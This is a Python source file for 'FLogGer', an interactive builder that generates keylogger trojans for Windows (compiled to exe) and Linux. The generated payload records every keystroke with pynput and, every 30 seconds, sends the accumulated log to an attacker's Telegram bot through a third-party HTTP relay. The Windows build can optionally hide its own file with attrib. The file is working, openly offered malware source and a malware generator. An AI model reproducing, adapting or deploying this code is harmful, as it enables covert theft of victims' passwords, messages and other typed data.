from os import system
from colorama import Fore
from time import sleep
from platform import uname
from rich.console import Console
from rich.table import Table

filePath = __file__
filePath = list(filePath)
x = 0
arry = ''
while x < len(filePath):
    if filePath[x] == '\\' :
        filePath[x] = '/'
    x+=1
for i in filePath :
    arry += i
filePath = arry.split('/FLogGer.py')

# Variable
targetInfo = uname()
filePath = filePath[0]+'/'
login = '0'
trojanData = {'token': None, 'chatId': None}
payloadName = 'file'
Red = Fore.RED
White = Fore.WHITE
Green = Fore.GREEN
Yellow = Fore.YELLOW

inputICon = (Green+'=-=>  '+White)

iconName = Green+'''
                        _____ _                 ____           
                        |  ___| |    ___   __ _ / ___| ___ _ __ 
                        | |_  | |   / _ \ / _` | |  _ / _ \ '__|
                        |  _| | |__| (_) | (_| | |_| |  __/ |   
                        |_|   |_____\___/ \__, |\____|\___|_|   
                                           |___/                           
'''

helpMessage = f'''
    {Yellow}╔══════════════════════════════════════════════════════════════════════════════╗
    {Yellow}║{Green} token          Telgram Bot Token < -bt 1313131:qwwwetfg3dfhdsdkwsm9mfks >    {Yellow}║
    {Yellow}║{Green} chatID         Telgram Chat Id < -ci 121212121 >                             {Yellow}║
    {Yellow}║{Green} payloadName    Set Payload Name (Default Name : file)                        {Yellow}║
    {Yellow}║{Green} options        Show option                                                   {Yellow}║
    {Yellow}║{Green} start          Start Compile                                                 {Yellow}║
    {Yellow}║{Green} help           Help                                                          {Yellow}║
    {Yellow}║{Green} exit           Exit                                                          {Yellow}║
    {Yellow}╚══════════════════════════════════════════════════════════════════════════════╝
'''+White

compilerMessage =f'''
    {Yellow}╔══════════════════════════════════════════════════════════════════════════════╗
    {Yellow}║{Green} windows        exe File (windows)                                            {Yellow}║
    {Yellow}║{Green} linux          sh File (linux)                                               {Yellow}║
    {Yellow}║{Green} help           Help                                                          {Yellow}║
    {Yellow}║{Green} back           Back to set payload options                                   {Yellow}║
    {Yellow}║{Green} exit                                                                         {Yellow}║
    {Yellow}╚══════════════════════════════════════════════════════════════════════════════╝
'''+White

# Def
def MakeOptionsTable():
    table = Table(title='Pyload Data')
    rows = [
        [trojanData['token'],trojanData['chatId'],payloadName],
    ]
    columns = [' Bot Token ', ' Chat ID ', ' Payload Name ']
    for column in columns:
        table.add_column(column)
    for row in rows:
        table.add_row(*row, style='bright_green')
    console = Console()
    return console.print(table)

def ToExe():
    system('pip install pyinstaller')
    print(Green+'pyinstaller install'+White)
    system(f'cd {filePath}/ && mkdir payload && cd payload && mkdir tmp && dir')
    print(Green+f'your File Path: {filePath}'+White)
    sleep(1)
    system(f'pyinstaller --onefile -c --distpath {filePath}/payload --workpath {filePath}/payload/tmp {payloadName}.py -w ')
    open(f'{payloadName}.py', 'w')
    print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour payload is in '+Green+f'{filePath}payload/{payloadName}.exe'+White+' directory\n════════════════════════════════════════════════════════════════════════════════════')


def Compiler():

    token = trojanData['token']
    chatId = trojanData['chatId']
    
    if trojanData['token'] == None or trojanData['chatId'] == None:
        print(White+f'bot token set ==> {token}\nchat Id set ==> {chatId}\n'+Red+'Fields should not be empty\ntry again\n'+White)
        return
    
    
    print(compilerMessage)

    while True:
        workSub = str(input(inputICon))
        if workSub == '':
            workSub = workSub.split()
            workSub.append('0')
        else:
            workSub = workSub.split()
                
        if workSub[0] == 'windows':
            x = input('Hide After Start y/n? ( default y ) ')
            if x == '':
                x = x.split()
                x.append('y')
            else:
                x = x.split()
            
            file = open(f'{payloadName}.py', 'w')
            if x[0] == 'n' or x[0] == 'N':            
                file.write(
                    f"from pynput import keyboard\nimport time\nimport requests\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
            else :
                file.write(
                    f"import os\nfrom pynput import keyboard\nimport time\nimport requests\npakegaName='{payloadName}.exe'\nfilePathh = __file__\nos.system(f'attrib.exe +s +h {{pakegaName}}')\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
                
            file.close()
            ToExe()
            
        elif workSub[0] == 'linux':
            file = open(f'{payloadName}.sh', 'w')
            file.write(
            f"#!/usr/bin/env python\nfrom pynput import keyboard\nimport time\nimport requests\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
            file.close()
            print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour file is in '+Green+f'{filePath}{payloadName}.sh'+White+' directory\n════════════════════════════════════════════════════════════════════════════════════')
        elif workSub[0] == 'Help':
            print(compilerMessage)
        elif workSub[0] == 'back':
            global login
            login = '0'
            WorkSubmit()
        elif workSub[0] == 'exit':
            exit()
        else :
            print(Red+'commend not found'+White)
            print(compilerMessage)

def WorkSubmit():
    global login
    
    if login == '0':
        print(iconName)
        print(helpMessage)
    else : 
        pass
    login = '1'
    workSub = str(input(inputICon))
    
    
    if workSub == '':
        workSub = workSub.split()
        workSub.append('0')
    else:
        workSub = workSub.split()
       
        
    if len(workSub)==1 and workSub[0] != 'Help' and workSub[0] != 'Exit' and workSub[0] != 'Start' and workSub[0] != 'Options':
        print('Usage:\n\t< -options command >')
    else:
        if workSub[0] == 'token':
            trojanData['token'] = workSub[1]
            print(Fore.WHITE+f'bot token set ==> {workSub[1]}')
            workSub[0] == '0'
        elif workSub[0] == 'chatID':
            trojanData['chatId'] = workSub[1]
            print(Fore.WHITE+f'chat Id set ==> {workSub[1]}')
            workSub[0] == '0'
        elif workSub[0] == 'payloadName':
            global payloadName
            payloadName = workSub[1]
            print(Fore.WHITE+f'payload name set ==> {workSub[1]}')
            workSub[0] == '0'
        elif workSub[0] == 'options':
            MakeOptionsTable()
            workSub[0] == '0'
        elif workSub[0] == 'start':
            Compiler()
            workSub[0] == '0'
        elif workSub[0] == 'help':
            print(helpMessage)
            workSub[0] == '0'
        elif workSub[0] == 'exit':
            exit()
        elif workSub[0] == '0':
            pass
        else:
            print(Fore.RED+'commend not found')
            print(helpMessage)

while True:
    WorkSubmit()